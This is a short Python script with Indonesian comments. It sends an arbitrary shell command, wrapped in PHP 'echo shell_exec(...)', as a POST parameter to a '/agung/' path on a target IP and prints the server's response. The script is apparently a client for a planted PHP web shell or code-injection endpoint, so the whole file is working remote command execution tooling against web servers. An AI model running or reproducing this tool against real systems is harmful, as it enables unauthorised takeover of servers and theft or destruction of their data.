import requests
import sys

if len(sys.argv) != 3:
    print("Usage: python3 agung.py <IP_ADDRESS> <COMMAND>")
    sys.exit(1)

ip_address = sys.argv[1]  # Ambil IP dari argumen pertama
command = sys.argv[2]      # Ambil perintah dari argumen kedua

url = f'http://{ip_address}/agung/'  # URL dari file PHP
payload = {
    'code': f'echo shell_exec("{command}");'  # Menggunakan command yang ingin dijalankan
}

try:
    response = requests.post(url, data=payload)
    print(f"[+] Status Code: {response.status_code}")
    print(f"[+] Response:\n{response.text.strip()}")  # Menampilkan output tanpa spasi tambahan
except Exception as e:
    print(f"[-] Error: {e}")
